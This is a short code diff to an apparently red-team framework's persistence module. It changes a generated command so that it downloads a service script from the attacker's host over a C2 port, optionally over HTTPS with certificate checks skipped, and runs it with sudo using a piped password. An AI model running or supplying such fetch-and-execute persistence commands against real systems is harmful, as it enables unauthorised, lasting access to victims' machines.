@@ -1374,7 +1374,11 @@ class PersistMigratedCommandSet(LazyOwnCommandSet):
             return
 
         password = self.params.get("start_pass", "CHANGE_ME")
-        cmd = f"curl http://{self.params['lhost']}/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
+        lport = self.params.get("c2_port", "4444")
+        use_ssl = os.path.exists("cert.pem") and os.path.exists("key.pem")
+        protocol = "https" if use_ssl else "http"
+        curl_flags = "-k" if use_ssl else ""
+        cmd = f"curl {curl_flags} {protocol}://{self.params['lhost']}:{lport}/s/{binary_name}_service.sh -o {binary_name}_service.sh && sudo -S chmod +x {binary_name}_service.sh && echo '{password}' | sudo -S bash {binary_name}_service.sh"
         print_msg(f"Run the following command to enable and start the service: {cmd}")
 
     @cmd2.with_category("05. Persistence")
